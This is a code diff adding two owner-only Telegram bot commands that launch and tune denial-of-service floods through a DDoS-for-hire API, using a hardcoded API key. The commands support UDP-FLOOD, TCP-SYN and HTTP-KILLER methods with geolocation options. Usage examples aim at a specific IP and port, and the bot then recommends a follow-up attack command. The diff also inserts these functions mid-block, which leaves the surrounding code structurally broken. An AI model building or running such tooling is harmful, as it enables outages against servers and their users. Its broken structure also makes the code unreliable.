@@ -2098,7 +2098,346 @@ if __name__ == "__main__":
     bot_thread.start()
     
     logger.info("✅ Bot thread started")
+    # Add this new command to test API parameters
+
+async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Test API with custom parameters"""
+    user_id = update.effective_user.id
     
+    # Only allow owners to test
+    if not db.is_owner_or_pseudo(user_id):
+        await update.message.reply_text("❌ Only owners can test API parameters!")
+        return
+    
+    args = context.args
+    if len(args) < 3:
+        await update.message.reply_text(
+            f"🔬 *API TEST COMMAND*\n\n"
+            f"Usage: `/testapi HOST PORT TIME [OPTIONS]`\n\n"
+            f"*Required:*\n"
+            f"• HOST - IP or domain\n"
+            f"• PORT - Port number\n"
+            f"• TIME - Duration in seconds\n\n"
+            f"*Optional Parameters:*\n"
+            f"• concs=N - Concurrent connections (default: 8)\n"
+            f"• method=METHOD - Attack method (default: UDP-FLOOD)\n"
+            f"• req_method=GET/POST - Request method\n"
+            f"• geoloc=MIX/ID/VN/KR/TH/JP/BR/CN/USA/UAE/RU/IND/DE - Location\n"
+            f"• version=1/2 - HTTP version\n"
+            f"• ratelimit=N - Requests per second\n"
+            f"• subnet=24-32 - Subnet mask\n"
+            f"• reconnect=N - Reconnections per proxy\n\n"
+            f"*Examples:*\n"
+            f"`/testapi 91.108.9.213 32000 60`\n"
+            f"`/testapi 91.108.9.213 32000 60 concs=8 method=UDP-FLOOD`\n"
+            f"`/testapi 91.108.9.213 32000 60 concs=12 method=TCP-SYN geoloc=USA`\n"
+            f"`/testapi 91.108.9.213 32000 60 concs=4 method=HTTP-KILLER req_method=POST`",
+            parse_mode='Markdown'
+        )
+        return
+    
+    try:
+        target = args[0]
+        port = int(args[1])
+        duration = int(args[2])
+        
+        # Parse optional parameters
+        params = {}
+        method = "UDP-FLOOD"
+        concurrent = 8
+        req_method = "GET"
+        geoloc = "MIX"
+        version = "1"
+        ratelimit = None
+        subnet = None
+        reconnect = None
+        
+        for arg in args[3:]:
+            if '=' in arg:
+                key, value = arg.split('=', 1)
+                key = key.lower()
+                
+                if key == 'concs':
+                    concurrent = int(value)
+                elif key == 'method':
+                    method = value.upper()
+                elif key == 'req_method':
+                    req_method = value.upper()
+                elif key == 'geoloc':
+                    geoloc = value.upper()
+                elif key == 'version':
+                    version = value
+                elif key == 'ratelimit':
+                    ratelimit = int(value)
+                elif key == 'subnet':
+                    subnet = int(value)
+                elif key == 'reconnect':
+                    reconnect = int(value)
+        
+        # Validate method
+        if method not in ATTACK_METHODS:
+            method = "UDP-FLOOD"
+        
+        # Show what we're testing
+        test_message = (
+            f"🔬 *API TEST*\n\n"
+            f"📡 Target: `{target}:{port}`\n"
+            f"⏱️ Duration: `{duration}s`\n"
+            f"📡 Method: `{method}`\n"
+            f"🔄 Concurrent: `{concurrent}`\n"
+            f"📊 Request Method: `{req_method}`\n"
+            f"📍 Geolocation: `{geoloc}`\n"
+        )
+        
+        if version:
+            test_message += f"🔢 HTTP Version: `{version}`\n"
+        if ratelimit:
+            test_message += f"⚡ Rate Limit: `{ratelimit}`\n"
+        if subnet:
+            test_message += f"🌐 Subnet: `{subnet}`\n"
+        if reconnect:
+            test_message += f"🔁 Reconnect: `{reconnect}`\n"
+        
+        test_message += f"\n⏳ Sending test request..."
+        
+        status_msg = await update.message.reply_text(test_message, parse_mode='Markdown')
+        
+        # Send the API request
+        result = await test_api_request(
+            target, port, duration, method, concurrent, 
+            req_method, geoloc, version, ratelimit, subnet, reconnect
+        )
+        
+        # Build response
+        if result.get('success'):
+            response_message = (
+                f"✅ *API TEST SUCCESSFUL*\n\n"
+                f"📡 Target: `{target}:{port}`\n"
+                f"⏱️ Duration: `{duration}s`\n"
+                f"🔄 Concurrent: `{concurrent}`\n"
+                f"📡 Method: `{method}`\n"
+                f"⚡ Status: `{result.get('status')}`\n"
+                f"⏱️ Response Time: `{result.get('elapsed', 0):.2f}s`\n"
+                f"📊 Response Code: `{result.get('response_code')}`\n\n"
+                f"📋 *Parameters Sent:*\n```\n{json.dumps(result.get('params_sent', {}), indent=2)}\n```\n"
+            )
+            
+            if result.get('response_data'):
+                response_message += (
+                    f"📋 *API Response:*\n```\n{json.dumps(result.get('response_data', {}), indent=2)[:500]}\n```\n"
+                )
+            
+            response_message += (
+                f"💡 *Test Different Values:*\n"
+                f"• `/testapi {target} {port} {duration} concs=4`\n"
+                f"• `/testapi {target} {port} {duration} concs=12`\n"
+                f"• `/testapi {target} {port} {duration} concs=16`\n\n"
+                f"⚠️ Check the API response to see what concurrent value was accepted!"
+            )
+        else:
+            response_message = (
+                f"❌ *API TEST FAILED*\n\n"
+                f"📡 Target: `{target}:{port}`\n"
+                f"🔄 Concurrent: `{concurrent}`\n"
+                f"❌ Error: `{result.get('error', 'Unknown error')}`\n"
+                f"📊 Status Code: `{result.get('status')}`\n\n"
+                f"📋 *Parameters Sent:*\n```\n{json.dumps(result.get('params_sent', {}), indent=2)}\n```\n"
+            )
+            
+            if result.get('response_text'):
+                response_message += f"📋 *Response:*\n```\n{result.get('response_text')[:300]}\n```\n"
+        
+        await status_msg.edit_text(response_message, parse_mode='Markdown')
+        
+    except ValueError as e:
+        await update.message.reply_text(f"❌ Invalid value: {e}")
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {str(e)}")
+
+async def test_api_request(target, port, duration, method, concurrent, req_method, geoloc, version, ratelimit, subnet, reconnect):
+    """Send test API request with custom parameters"""
+    api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
+    api_url = os.getenv("API_URL", "https://mrstresser.com/api")
+    
+    if not api_key:
+        return {"success": False, "error": "API Key missing"}
+    
+    api_method = METHOD_MAP.get(method.upper(), "udp-flood")
+    
+    # Build parameters
+    params = {
+        "key": api_key,
+        "host": target,
+        "port": str(port),
+        "time": str(duration),
+        "method": api_method,
+    }
+    
+    # Add all possible concurrent parameter names
+    params["concs"] = str(concurrent)
+    params["concurrent"] = str(concurrent)
+    params["threads"] = str(concurrent)
+    params["connections"] = str(concurrent)
+    
+    # Add advanced options
+    params["req_method"] = req_method
+    params["geoloc"] = geoloc
+    
+    if version:
+        params["version"] = str(version)
+    if ratelimit:
+        params["ratelimit"] = str(ratelimit)
+    if subnet:
+        params["subnet"] = str(subnet)
+    if reconnect:
+        params["reconnect"] = str(reconnect)
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Connection": "keep-alive",
+        "X-Test-Mode": "true"
+    }
+    
+    connector = aiohttp.TCPConnector(limit=10)
+    timeout = aiohttp.ClientTimeout(total=30, connect=10)
+    
+    try:
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
+            start_time = time.time()
+            
+            async with session.get(api_url, params=params) as response:
+                elapsed = time.time() - start_time
+                
+                try:
+                    response_text = await response.text(encoding='utf-8', errors='ignore')
+                    response_data = json.loads(response_text) if response_text else {}
+                except:
+                    response_text = "Unable to read response"
+                    response_data = {}
+                
+                return {
+                    "success": response.status == 200,
+                    "status": response.status,
+                    "elapsed": elapsed,
+                    "response_code": response.status,
+                    "response_data": response_data,
+                    "response_text": response_text,
+                    "params_sent": params
+                }
+                
+    except Exception as e:
+        return {
+            "success": False,
+            "error": str(e),
+            "params_sent": params
+        }
+
+# Also add a quick test for different concurrent values
+async def test_concurrents_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Test multiple concurrent values at once"""
+    user_id = update.effective_user.id
+    
+    if not db.is_owner_or_pseudo(user_id):
+        await update.message.reply_text("❌ Only owners can test!")
+        return
+    
+    args = context.args
+    if len(args) < 3:
+        await update.message.reply_text(
+            f"🔬 *TEST CONCURRENT VALUES*\n\n"
+            f"Usage: `/testconcs HOST PORT TIME [METHOD]`\n"
+            f"Example: `/testconcs 91.108.9.213 32000 60 UDP-FLOOD`\n\n"
+            f"This will test: 1, 2, 4, 8, 12, 16 concurrent values\n"
+            f"Shows which values the API accepts!",
+            parse_mode='Markdown'
+        )
+        return
+    
+    try:
+        target = args[0]
+        port = int(args[1])
+        duration = int(args[2])
+        method = args[3].upper() if len(args) > 3 else "UDP-FLOOD"
+        
+        if method not in ATTACK_METHODS:
+            method = "UDP-FLOOD"
+        
+        status_msg = await update.message.reply_text(
+            f"🔬 *Testing Concurrent Values...*\n\n"
+            f"Target: `{target}:{port}`\n"
+            f"Method: `{method}`\n"
+            f"Testing: 1, 2, 4, 8, 12, 16\n\n"
+            f"⏳ Sending test requests...",
+            parse_mode='Markdown'
+        )
+        
+        test_values = [1, 2, 4, 8, 12, 16]
+        results = []
+        
+        for concs in test_values:
+            result = await test_api_request(
+                target, port, duration, method, concs,
+                "GET", "MIX", "1", None, None, None
+            )
+            
+            status = "✅" if result.get('success') else "❌"
+            results.append(f"{status} concs={concs} → {result.get('status', 'Error')}")
+            
+            # Update progress
+            await status_msg.edit_text(
+                f"🔬 *Testing Concurrent Values...*\n\n"
+                f"Target: `{target}:{port}`\n"
+                f"Method: `{method}`\n"
+                f"Progress: {len(results)}/{len(test_values)}\n\n"
+                f"Results:\n" + "\n".join(results),
+                parse_mode='Markdown'
+            )
+            
+            await asyncio.sleep(0.5)  # Small delay between tests
+        
+        # Final results with recommendation
+        successful = [r for r in results if r.startswith("✅")]
+        failed = [r for r in results if r.startswith("❌")]
+        
+        final_message = (
+            f"🔬 *Concurrent Test Results*\n\n"
+            f"Target: `{target}:{port}`\n"
+            f"Method: `{method}`\n\n"
+            f"*Results:*\n" + "\n".join(results) + "\n\n"
+        )
+        
+        if successful:
+            # Extract the highest successful concurrent value
+            highest = 0
+            for s in successful:
+                val = int(s.split("concs=")[1].split(" ")[0])
+                if val > highest:
+                    highest = val
+            
+            final_message += (
+                f"💡 *Recommendation:*\n"
+                f"• Highest working concurrent: **{highest}**\n"
+                f"• Set default: `/setconcurrent {highest}`\n"
+                f"• Use in attack: `/attack {target} {port} {duration} {method} {highest}`\n\n"
+            )
+        else:
+            final_message += (
+                f"❌ *No concurrent values worked!*\n"
+                f"Try using the default API parameters.\n\n"
+            )
+        
+        final_message += (
+            f"📋 *To test specific values:*\n"
+            f"`/testapi {target} {port} {duration} concs=8`\n"
+            f"`/testapi {target} {port} {duration} concs=4`"
+        )
+        
+        await status_msg.edit_text(final_message, parse_mode='Markdown')
+        
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {str(e)}")
     # Run Quart with hypercorn
     config = Config()
     config.bind = [f"0.0.0.0:{PORT}"]
